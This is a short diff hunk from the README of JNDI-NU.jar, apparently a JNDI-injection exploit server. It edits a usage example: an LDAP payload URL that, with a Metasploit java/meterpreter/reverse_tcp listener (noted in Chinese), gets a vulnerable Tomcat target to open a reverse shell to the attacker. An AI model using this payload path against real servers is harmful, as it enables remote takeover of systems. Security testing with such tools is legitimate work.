@@ -38,7 +38,7 @@ Usage: java -jar JNDI-NU.jar [options]
 
 ```
   使用msf的java/meterpreter/reverse_tcp开启监听
-  ldap://127.0.0.1:1389/TomcatBypass/Meterpreter/[msfip]/[msfport]
+  ldap://127.0.0.1:1389/TomcatBypass/Meterpreter/msf/[msfip]/[msfport]
 ```
 
 ---
